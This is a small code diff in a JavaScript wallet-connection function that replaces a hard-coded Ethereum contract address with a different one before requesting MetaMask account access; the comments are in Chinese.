@@ -871,7 +871,7 @@ async function handleWallet(walletName) {
       if (typeof window.ethereum !== 'undefined') {
           // MetaMask已安装
           try {
-              const contractAddress = "0x40ABC1FAd8285F75Ca1bE733c98887908ce85936"
+              const contractAddress = "0x8DE6E84186ce27E8766d01422C200eabF770ff38"
               const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' }); // 请求用户授权
               const curAccount = accounts[0]; // 获取当前用户的钱包地址
               const web3 = new Web3(window.ethereum);
